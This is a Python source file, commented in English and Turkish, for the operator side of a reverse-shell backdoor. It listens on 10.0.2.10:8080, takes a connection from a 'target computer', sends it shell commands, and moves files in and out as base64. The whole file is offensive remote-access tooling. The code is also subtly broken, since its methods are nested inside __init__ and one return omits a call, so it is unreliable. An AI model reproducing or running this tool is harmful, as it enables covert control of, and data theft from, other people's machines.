import socket
import json
import base64
import simplejson
class SocketListener:
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)#We specify that we want to use this listener constantly by changing the options of the socket method.--Soket yönteminin seçeneklerini değiştirerek bu dinleyiciyi sürekli kullanmak istediğimizi belirtiyoruz.
        my_listener.bind((ip,port))
        my_listener.listen(0)#We start to listen.-Dinlemeyi başlatıyoruz.
        (self.my_connection, my_address)=my_listener.accept()#If the link comes, we accept it. The statement my_listener.accept returns us a touple, and this touple contains the link and the address of the target computer.Bağlantı gelirse kabul ederiz. My_listener.accept ifadesi bize bir eşleme döndürür ve bu eşleme, hedef bilgisayarın bağlantısını ve adresini içerir.
        print("Connection OK from " + str(my_address))
        #In order for the sent and received data to be understood and processed more properly, we write the following two functions in order to send the data with json packets.--Gönderilen ve alınan verilerin daha doğru anlaşılması ve işlenebilmesi için json paketleri ile veri göndermek için aşağıdaki iki işlevi yazıyoruz.
        def json_send(self, data):
            #json_data = json.dumps(data)
            json_data = simplejson.dumps(data)
            self.my_connection.send(json_data.encode("utf-8"))
            
            
        def json_receive(self):
            json_data = ""
            while True:
                try:
                    json_data = json_data + self.my_connection.recv(1024).decode()
                    return simplejson.loads(json_data)
                except ValueError:
                    continue
                
        def get_file_content(self,path):
            with open(path, "rb") as myfile:#We find the file to be downloaded on the target computer, read it as binary and save it in a file named myfile.--Hedef bilgisayarda indirilecek dosyayı bulup ikili olarak okuyor ve myfile adlı bir dosyaya kaydediyoruz.
                return base64.b64encode(myfile.read())#In order to download files with special characters (jpg), we get the files from the target computer in base64 format.--Özel karakter (jpg) içeren dosyaları indirmek için, dosyaları hedef bilgisayardan base64 formatında alıyoruz.
    
        
                
        def save_file(self,path,content):
            with open(path, "wb") as my_file:
                my_file.write(base64.b64decode(content))
                return "Download OK"
        
        
        
        def command_execution(self, command_input):

             self.json_send(command_input)#Using the my_connection connection, we send the inputs entered by the user to the target computer.--My_connection bağlantısını kullanarak, kullanıcı tarafından girilen girişleri hedef bilgisayara göndeririz.
             if command_input[0] == "quit":#By writing this "if" condition, we made the exit process to be quit with quit input.--Bu "eğer" koşulunu yazarak, çıkış işleminin çıkma girdisi ile çıkmasını sağladık.
                 self.my_connection.close()
                 exit()
             return self.json_receive #We retrieve the outputs of the commands executed on the target computer with the recv method.--Recv yöntemi ile hedef bilgisayarda çalıştırılan komutların çıktılarını alıyoruz.
    
        def start_listener(self):
            while True: 
                command_input = raw_input("Enter the command: ")#We create a variable using the input method to receive commands from the user.--Kullanıcıdan komut almak için input yöntemini kullanarak bir değişken oluşturuyoruz.(raw_input for python2)
                command_input = command_input.split(" ")#We make the codes received from the user into a list and make them workable.--Kullanıcıdan gelen kodları bir liste haline getirerek çalışır hale getiriyoruz.             
                try:
                    if command_input[0]=="upload":
                        my_file_content = self.get_file_content(command_input[1])
                        command_input.append(my_file_content)
                    command_output = self.command_execution(command_input)    
                        
                        
                    if command_input[0] == "download" and "Error" not in command_output:#If we give the "download" expression as an input to the listener, we will convert the binary expression coming from the target computer to the content on the host computer with the following function call.--Dinleyiciye girdi olarak "indir" ifadesini verirsek, aşağıdaki fonksiyon çağrısı ile hedef bilgisayardan gelen ikili ifadeyi ana bilgisayardaki içeriğe çevireceğiz.
                        command_output = self.save_file(command_input[1], command_output)
                except:
                    command_output = "error"
                print(command_output)
                
            
            
new_socket_listener= SocketListener("10.0.2.10", 8080)
new_socket_listener.start_listener()